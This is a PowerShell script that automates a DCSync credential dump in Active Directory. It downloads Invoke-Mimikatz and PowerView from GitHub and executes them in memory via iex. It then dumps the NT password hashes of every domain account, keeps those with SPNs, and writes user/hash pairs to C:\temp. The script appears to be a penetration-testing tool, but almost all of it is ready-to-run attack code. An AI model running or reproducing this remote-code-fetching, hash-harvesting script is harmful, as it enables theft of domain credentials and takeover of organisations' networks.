# Author: LRVT - https://github.com/l4rm4nd/

# variables
$DATE = $(get-date -f yyyyMMddThhmm)
$PATH = "C:\temp\" + $DATE + "_" + "DCSYNC" + "\"
$EXT = ".txt"
$LOG = $PATH + $DATE + "_" + "DCSync_NTLM_full" + $EXT
$LOGSPN = $PATH + $DATE + "_" + "DCSYNC_NTLM_SPN_full" + $EXT
$HASHES = $PATH + $DATE + "_" + "DCSync_NTLM_Hashes_FINAL" + $EXT
$USERS = $PATH + $DATE + "_" + "DCSync_NTLM_Users_FINAL" + $EXT
$IMPORTFILE = $PATH + $DATE + "_" + "DCSync_NTLM_UserHash_Import_FINAL" + $EXT

# download mimikatz into memory
Write-Host "[INFO] Downloading Mimikatz into Memory" -ForegroundColor Gray
iex(new-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/pentestfactory/nishang/master/Gather/Invoke-Mimikatz.ps1')

# download poweview into memory
Write-Host "[INFO] Downloading PowerView into Memory" -ForegroundColor Gray
iex(new-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/pentestfactory/PowerSploit/dev/Recon/PowerView.ps1')

# print out domain context
$domain = get-netdomain | Select-Object -property Name | foreach { $_.Name}
Write-Host "[INFO] DCSync will be executed for the domain: $domain" -ForegroundColor Red

$confirmation = Read-Host "Is the domain correct to execute DCSync on? (y/n)"
if ($confirmation -eq 'y') {

    # create directory for storage
    Write-Host ""
    Write-Host "[INFO] Creating new directory at $PATH" -ForegroundColor Gray
    New-Item -ItemType Directory -Force -Path $PATH | Out-Null

    # enumerate user accounts with service principal name (SPN)
    Write-Host "[INFO] Enumerating user accounts with set SPN" -ForegroundColor Gray
    $loop = Get-DomainUser -SPN | Select-Object -property samaccountname | foreach { $_.samaccountname }

    # execute DCSync over the whole domain
    Write-Host "[!] Exporting NT-Hashes via DCSync" -ForegroundColor Yellow
    $command = '"log ' + $LOG + '" "lsadump::dcsync /domain:'+ $DOMAIN +' /all /csv"'
    Invoke-Mimikatz -Command $command

    # loop over DCSync log file and filter for SPN user accounts
    Write-Host "[!] Extracting SPN users from DCSync logfile" -ForegroundColor Yellow
    foreach ($spn in $loop) {
    get-content $LOG -ReadCount 1000 |
        foreach { $_ -match $spn } >> $LOGSPN
    }

    # GET NT-HASHES ONLY
    Write-Host "[~] Extracting NT-Hashes from logfile" -ForegroundColor Yellow
    (Get-Content -LiteralPath $LOGSPN) -notmatch '\$' | ForEach-Object {$_.Split("`t")[2]} > $HASHES

    # GET USERS ONLY
    Write-Host "[~] Extracting users from logfile" -ForegroundColor Yellow
    (Get-Content -LiteralPath $LOGSPN) -notmatch '\$' | ForEach-Object {$_.Split("`t")[1]} > $USERS

    # CONCAT USER AND NT-HASH INTO OUTFILE
    Write-Host "[~] Create user/hash merge file" -ForegroundColor Yellow
    $File1 = Get-Content $USERS
    $File2 = Get-Content $HASHES
    for($i = 0; $i -lt $File1.Count; $i++)
    {
        ('{0},{1}' -f $File1[$i],$File2[$i]) |Add-Content $IMPORTFILE
    }

}else{
    Write-Host "[!] Script aborted due to wrong domain. Please hardcode the domain in the PS1 script (line 21)." -ForegroundColor Red
}
